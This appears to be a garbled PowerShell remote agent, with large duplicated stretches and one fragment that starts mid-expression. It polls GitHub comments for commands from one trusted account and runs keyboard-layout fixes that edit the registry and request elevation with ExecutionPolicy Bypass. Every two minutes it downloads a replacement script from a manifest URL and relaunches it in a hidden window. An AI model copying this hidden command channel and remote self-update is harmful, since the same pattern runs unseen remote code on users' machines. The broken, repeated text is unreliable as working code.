      Set-ItemProperty -Path 'HKCU:\Keyboard Layout\Preload' -Name '1' -Value '00010416' -Force
      $r.preloadFixed = $true

      try {
        $v = Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Keyboard Layout' -Name 'Scancode Map' -ErrorAction Stop
        if ($null -ne $v.'Scancode Map') {
          $r.scancodeMapPresent = $true
          try {
            Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Keyboard Layout' -Name 'Scancode Map' -Force -ErrorAction Stop
            $r.scancodeMapRemoved = $true
          } catch {
            $adminFix = Join-Path $BaseDir 'fix-question-key-admin.ps1'
            @"
Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Keyboard Layout' -Name 'Scancode Map' -Force -ErrorAction SilentlyContinue
Stop-Process -Name ctfmon -Force -ErrorAction SilentlyContinue
Start-Process "$env:WINDIR\System32\ctfmon.exe"
"@ | Set-Content -Path $adminFix -Encoding UTF8
            try {
              Start-Process powershell.exe -Verb RunAs -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',$adminFix)
              $r.elevationRequested = $true
            } catch {}
          }
        }
      } catch {}

      Stop-Process -Name ctfmon -Force -ErrorAction SilentlyContinue
      Start-Process "$env:WINDIR\System32\ctfmon.exe"
      $r.ctfmonRestarted = $true

      return $r
    }

    default {
      throw 'operation_not_allowed'
    }
  }
}

function Test-PowerShellSyntax([string]$Path) {
  if (-not (Test-Path $Path -PathType Leaf)) { return $false }
  try {
    $tokens = $null
    $errors = $null
    [System.Management.Automation.Language.Parser]::ParseFile($Path, [ref]$tokens, [ref]$errors) | Out-Null
    return (@($errors).Count -eq 0)
  } catch {
    return $false
  }
}

function Check-SelfUpdate {
  try {
    $stamp = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
    $manifest = Invoke-RestMethod -UseBasicParsing -Uri ($ManifestUrl + '?t=' + $stamp) -TimeoutSec 15
    if ([string]::IsNullOrWhiteSpace([string]$manifest.url) -or [string]::IsNullOrWhiteSpace([string]$manifest.sha256)) {
      throw 'invalid_update_manifest'
    }

    $expectedHash = ([string]$manifest.sha256).ToLowerInvariant()
    $currentHash = ''
    if (Test-Path $AgentFile -PathType Leaf) {
      try { $currentHash = (Get-FileHash $AgentFile -Algorithm SHA256).Hash.ToLowerInvariant() } catch {}
    }
    if ($currentHash -eq $expectedHash) { return }

    $tmp = Join-Path $BaseDir 'agent-v2.candidate.ps1'
    Remove-Item $tmp -Force -ErrorAction SilentlyContinue
    Invoke-WebRequest -UseBasicParsing -Uri ([string]$manifest.url + '?t=' + $stamp) -OutFile $tmp -TimeoutSec 20

    $newHash = (Get-FileHash $tmp -Algorithm SHA256).Hash.ToLowerInvariant()
    if ($newHash -ne $expectedHash) {
      Remove-Item $tmp -Force -ErrorAction SilentlyContinue
      throw 'update_hash_mismatch'
    }
    if (-not (Test-PowerShellSyntax $tmp)) {
      Remove-Item $tmp -Force -ErrorAction SilentlyContinue
      throw 'update_syntax_invalid'
    }

    @{
      targetVersion = [string]$manifest.version
      targetHash = $expectedHash
      started = (Get-Date).ToString('o')
    } | ConvertTo-Json -Compress | Set-Content -Path $PendingFile -Encoding UTF8

    if (Test-Path $AgentFile -PathType Leaf) {
      if (Test-PowerShellSyntax $AgentFile) {
        [IO.File]::Replace($tmp, $AgentFile, $BackupFile, $true)
      } else {
        Move-Item $tmp $AgentFile -Force
      }
    } else {
      Move-Item $tmp $AgentFile -Force
    }

    Write-Log ('Self-update preparado e validado: ' + [string]$manifest.version + ' hash=' + $expectedHash)
    try { $script:BridgeMutex.ReleaseMutex() } catch {}
    Start-Process powershell.exe -ArgumentList @('-NoProfile','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File',$AgentFile) -WindowStyle Hidden
    Start-Sleep -Milliseconds 300
    exit
  } catch {
    Write-Log ('Self-update falhou: ' + $_.Exception.Message)
  }
}

New-Item -ItemType Directory -Force -Path $BaseDir | Out-Null
Initialize-GitHubApi
Ensure-Watchdog

$state = Get-State
$lastId = [long]$state.lastCommentId
if ($lastId -eq 0) {
  $lastId = Get-MaxCommentId
  Save-State $lastId
}

Write-Log ("Agente V2 iniciado PID=$PID last=$lastId")
Post-Comment ("RB2_STATUS" + [Environment]::NewLine + (Encode-Json @{
  status='online'; version=$Version; pid=$PID; machine=$env:COMPUTERNAME; timestamp=(Get-Date).ToString('o')
})) | Out-Null
Write-Health 1000
Remove-Item $PendingFile -Force -ErrorAction SilentlyContinue

$lastUpdateCheck = Get-Date
$pollSince = (Get-Date).ToUniversalTime().AddSeconds(-10)
$pollDelayMs = 2000
$activeUntil = (Get-Date).AddSeconds(10)
$lastHealthWrite = (Get-Date).AddMinutes(-1)

while ($true) {
  try {
    $comments = @(Poll-Comments $pollSince)
    if ($comments.Count -gt 0) {
      foreach ($c in @($comments | Sort-Object id)) {
        $cid = [long]$c.id
        if ($cid -le $lastId) { continue }

        $lastId = $cid
        Save-State $lastId

        if ($c.user.login -ne $Trusted) { continue }
        $body = [string]$c.body
        if (-not $body.StartsWith('RB2_CMD ')) { continue }

        $lines = $body -split "\r?\n"
        $header = $lines[0].Split(' ', [StringSplitOptions]::RemoveEmptyEntries)
        if ($header.Count -lt 3) { continue }

        $cmdId = [string]$header[1]
        $op = [string]$header[2]
        if ($cmdId -notmatch '^[A-Za-z0-9._-]{1,64}$') { continue }
        try {
          $created = [DateTimeOffset]::Parse([string]$c.created_at)
          if (([DateTimeOffset]::UtcNow - $created.ToUniversalTime()).TotalMinutes -gt 10) { continue }
        } catch {}
        $activeUntil = (Get-Date).AddSeconds(30)
        $cmdArgs = [pscustomobject]@{}
        if ($lines.Count -ge 2 -and -not [string]::IsNullOrWhiteSpace($lines[1])) {
          try { $cmdArgs = Decode-Json $lines[1].Trim() } catch {
            Reply $cmdId $false $null 'invalid_payload'
            continue
          }
        }

        try {
          $result = Invoke-AllowedOperation $op $cmdArgs
          Reply $cmdId $true $result ''
        } catch {
          Reply $cmdId $false $null $_.Exception.Message
        }
      }

      $latestCreated = $null
      foreach ($item in @($comments)) {
        try {
          $dt = [DateTimeOffset]::Parse([string]$item.created_at).UtcDateTime
          if ($null -eq $latestCreated -or $dt -gt $latestCreated) { $latestCreated = $dt }
        } catch {}
      }
      if ($null -ne $latestCreated -and $latestCreated -gt $pollSince.AddSeconds(2)) {
        $pollSince = $latestCreated.AddSeconds(-2)
        $script:CommentsEtag = $null
      }
    }

    if ((Get-Date) -lt $activeUntil) { $pollDelayMs = 1000 } else { $pollDelayMs = 2000 }
  } catch {
    Write-Log ('Loop error: ' + $_.Exception.Message)
    if ($_.Exception.Message -eq 'github_rate_limited') {
      $pollDelayMs = 60000
    } else {
      $pollDelayMs = [Math]::Min([Math]::Max($pollDelayMs * 2, 3000), 30000)
    }
  }

  if (((Get-Date) - $lastHealthWrite).TotalSeconds -ge 10) {
    Write-Health $pollDelayMs
    $lastHealthWrite = Get-Date
  }

  if (((Get-Date) - $lastUpdateCheck).TotalMinutes -ge 2) {
    Check-SelfUpdate
    $lastUpdateCheck = Get-Date
  }

  Start-Sleep -Milliseconds $pollDelayMs
}
 -and
          $_.CommandLine -like '*CORRIGIR_INTERROGACAO.ahk*'
        } |
        ForEach-Object {
          [ordered]@{ pid=$_.ProcessId; name=$_.Name; commandLine=$_.CommandLine }
        })

      return @{
        applied = ($running.Count -gt 0)
        scanCode = 'SC073'
        normal = '/'
        shifted = '?'
        scriptPath = $scriptPath
        autoHotkey = $exe
        processes = @($running)
      }
    }

    'KEYBOARD_DIAG' {
      $langs = @(Get-WinUserLanguageList | ForEach-Object {
        [ordered]@{
          languageTag = $_.LanguageTag
          inputTips = @($_.InputMethodTips)
        }
      })
      $override = ''
      try { $override = [string](Get-WinDefaultInputMethodOverride).InputTip } catch {}
      $scanMapPresent = $false
      try {
        $v = Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Keyboard Layout' -Name 'Scancode Map' -ErrorAction Stop
        $scanMapPresent = ($null -ne $v.'Scancode Map')
      } catch {}
      return @{ languages=@($langs); override=$override; scancodeMapPresent=$scanMapPresent }
    }

    'FIX_QUESTION_KEY' {
      $r = [ordered]@{
        languageFixed = $false
        overrideFixed = $false
        preloadFixed = $false
        scancodeMapPresent = $false
        scancodeMapRemoved = $false
        elevationRequested = $false
        ctfmonRestarted = $false
      }

      $l = New-WinUserLanguageList 'pt-BR'
      $l[0].InputMethodTips.Clear()
      $l[0].InputMethodTips.Add('0416:00010416')
      Set-WinUserLanguageList $l -Force
      $r.languageFixed = $true

      Set-WinDefaultInputMethodOverride -InputTip '0416:00010416'
      $r.overrideFixed = $true

      New-Item -Path 'HKCU:\Keyboard Layout\Preload' -Force | Out-Null
      Set-ItemProperty -Path 'HKCU:\Keyboard Layout\Preload' -Name '1' -Value '00010416' -Force
      $r.preloadFixed = $true

      try {
        $v = Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Keyboard Layout' -Name 'Scancode Map' -ErrorAction Stop
        if ($null -ne $v.'Scancode Map') {
          $r.scancodeMapPresent = $true
          try {
            Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Keyboard Layout' -Name 'Scancode Map' -Force -ErrorAction Stop
            $r.scancodeMapRemoved = $true
          } catch {
            $adminFix = Join-Path $BaseDir 'fix-question-key-admin.ps1'
            @"
Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Keyboard Layout' -Name 'Scancode Map' -Force -ErrorAction SilentlyContinue
Stop-Process -Name ctfmon -Force -ErrorAction SilentlyContinue
Start-Process "$env:WINDIR\System32\ctfmon.exe"
"@ | Set-Content -Path $adminFix -Encoding UTF8
            try {
              Start-Process powershell.exe -Verb RunAs -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',$adminFix)
              $r.elevationRequested = $true
            } catch {}
          }
        }
      } catch {}

      Stop-Process -Name ctfmon -Force -ErrorAction SilentlyContinue
      Start-Process "$env:WINDIR\System32\ctfmon.exe"
      $r.ctfmonRestarted = $true

      return $r
    }

    default {
      throw 'operation_not_allowed'
    }
  }
}

function Test-PowerShellSyntax([string]$Path) {
  if (-not (Test-Path $Path -PathType Leaf)) { return $false }
  try {
    $tokens = $null
    $errors = $null
    [System.Management.Automation.Language.Parser]::ParseFile($Path, [ref]$tokens, [ref]$errors) | Out-Null
    return (@($errors).Count -eq 0)
  } catch {
    return $false
  }
}

function Check-SelfUpdate {
  try {
    $stamp = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
    $manifest = Invoke-RestMethod -UseBasicParsing -Uri ($ManifestUrl + '?t=' + $stamp) -TimeoutSec 15
    if ([string]::IsNullOrWhiteSpace([string]$manifest.url) -or [string]::IsNullOrWhiteSpace([string]$manifest.sha256)) {
      throw 'invalid_update_manifest'
    }

    $expectedHash = ([string]$manifest.sha256).ToLowerInvariant()
    $currentHash = ''
    if (Test-Path $AgentFile -PathType Leaf) {
      try { $currentHash = (Get-FileHash $AgentFile -Algorithm SHA256).Hash.ToLowerInvariant() } catch {}
    }
    if ($currentHash -eq $expectedHash) { return }

    $tmp = Join-Path $BaseDir 'agent-v2.candidate.ps1'
    Remove-Item $tmp -Force -ErrorAction SilentlyContinue
    Invoke-WebRequest -UseBasicParsing -Uri ([string]$manifest.url + '?t=' + $stamp) -OutFile $tmp -TimeoutSec 20

    $newHash = (Get-FileHash $tmp -Algorithm SHA256).Hash.ToLowerInvariant()
    if ($newHash -ne $expectedHash) {
      Remove-Item $tmp -Force -ErrorAction SilentlyContinue
      throw 'update_hash_mismatch'
    }
    if (-not (Test-PowerShellSyntax $tmp)) {
      Remove-Item $tmp -Force -ErrorAction SilentlyContinue
      throw 'update_syntax_invalid'
    }

    @{
      targetVersion = [string]$manifest.version
      targetHash = $expectedHash
      started = (Get-Date).ToString('o')
    } | ConvertTo-Json -Compress | Set-Content -Path $PendingFile -Encoding UTF8

    if (Test-Path $AgentFile -PathType Leaf) {
      if (Test-PowerShellSyntax $AgentFile) {
        [IO.File]::Replace($tmp, $AgentFile, $BackupFile, $true)
      } else {
        Move-Item $tmp $AgentFile -Force
      }
    } else {
      Move-Item $tmp $AgentFile -Force
    }

    Write-Log ('Self-update preparado e validado: ' + [string]$manifest.version + ' hash=' + $expectedHash)
    try { $script:BridgeMutex.ReleaseMutex() } catch {}
    Start-Process powershell.exe -ArgumentList @('-NoProfile','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File',$AgentFile) -WindowStyle Hidden
    Start-Sleep -Milliseconds 300
    exit
  } catch {
    Write-Log ('Self-update falhou: ' + $_.Exception.Message)
  }
}

New-Item -ItemType Directory -Force -Path $BaseDir | Out-Null
Initialize-GitHubApi
Ensure-Watchdog

$state = Get-State
$lastId = [long]$state.lastCommentId
if ($lastId -eq 0) {
  $lastId = Get-MaxCommentId
  Save-State $lastId
}

Write-Log ("Agente V2 iniciado PID=$PID last=$lastId")
Post-Comment ("RB2_STATUS" + [Environment]::NewLine + (Encode-Json @{
  status='online'; version=$Version; pid=$PID; machine=$env:COMPUTERNAME; timestamp=(Get-Date).ToString('o')
})) | Out-Null
Write-Health 1000
Remove-Item $PendingFile -Force -ErrorAction SilentlyContinue

$lastUpdateCheck = Get-Date
$pollSince = (Get-Date).ToUniversalTime().AddSeconds(-10)
$pollDelayMs = 2000
$activeUntil = (Get-Date).AddSeconds(10)
$lastHealthWrite = (Get-Date).AddMinutes(-1)

while ($true) {
  try {
    $comments = @(Poll-Comments $pollSince)
    if ($comments.Count -gt 0) {
      foreach ($c in @($comments | Sort-Object id)) {
        $cid = [long]$c.id
        if ($cid -le $lastId) { continue }

        $lastId = $cid
        Save-State $lastId

        if ($c.user.login -ne $Trusted) { continue }
        $body = [string]$c.body
        if (-not $body.StartsWith('RB2_CMD ')) { continue }

        $lines = $body -split "\r?\n"
        $header = $lines[0].Split(' ', [StringSplitOptions]::RemoveEmptyEntries)
        if ($header.Count -lt 3) { continue }

        $cmdId = [string]$header[1]
        $op = [string]$header[2]
        if ($cmdId -notmatch '^[A-Za-z0-9._-]{1,64}$') { continue }
        try {
          $created = [DateTimeOffset]::Parse([string]$c.created_at)
          if (([DateTimeOffset]::UtcNow - $created.ToUniversalTime()).TotalMinutes -gt 10) { continue }
        } catch {}
        $activeUntil = (Get-Date).AddSeconds(30)
        $cmdArgs = [pscustomobject]@{}
        if ($lines.Count -ge 2 -and -not [string]::IsNullOrWhiteSpace($lines[1])) {
          try { $cmdArgs = Decode-Json $lines[1].Trim() } catch {
            Reply $cmdId $false $null 'invalid_payload'
            continue
          }
        }

        try {
          $result = Invoke-AllowedOperation $op $cmdArgs
          Reply $cmdId $true $result ''
        } catch {
          Reply $cmdId $false $null $_.Exception.Message
        }
      }

      $latestCreated = $null
      foreach ($item in @($comments)) {
        try {
          $dt = [DateTimeOffset]::Parse([string]$item.created_at).UtcDateTime
          if ($null -eq $latestCreated -or $dt -gt $latestCreated) { $latestCreated = $dt }
        } catch {}
      }
      if ($null -ne $latestCreated -and $latestCreated -gt $pollSince.AddSeconds(2)) {
        $pollSince = $latestCreated.AddSeconds(-2)
        $script:CommentsEtag = $null
      }
    }

    if ((Get-Date) -lt $activeUntil) { $pollDelayMs = 1000 } else { $pollDelayMs = 2000 }
  } catch {
    Write-Log ('Loop error: ' + $_.Exception.Message)
    if ($_.Exception.Message -eq 'github_rate_limited') {
      $pollDelayMs = 60000
    } else {
      $pollDelayMs = [Math]::Min([Math]::Max($pollDelayMs * 2, 3000), 30000)
    }
  }

  if (((Get-Date) - $lastHealthWrite).TotalSeconds -ge 10) {
    Write-Health $pollDelayMs
    $lastHealthWrite = Get-Date
  }

  if (((Get-Date) - $lastUpdateCheck).TotalMinutes -ge 2) {
    Check-SelfUpdate
    $lastUpdateCheck = Get-Date
  }

  Start-Sleep -Milliseconds $pollDelayMs
}
